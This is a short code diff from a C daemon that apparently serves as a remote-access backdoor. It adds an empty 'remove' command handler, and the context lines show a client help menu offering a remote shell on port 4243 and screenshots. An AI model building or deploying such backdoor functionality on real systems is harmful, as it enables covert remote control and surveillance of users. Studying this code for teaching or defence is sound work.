@@ -231,6 +231,9 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 							users.key[users.i] = false;
 							users.nb_user--;
 						}
+						if (!strcmp(buffer, "remove"))
+						{
+						}
 						if (!strcmp(buffer, "?"))
 							send(users.sd, "\n'shell'\tSpawn remote shell on 4243\n'screenshot'	take screen\n> ", 63, 0);
 						else if (!strcmp(buffer, "shell"))
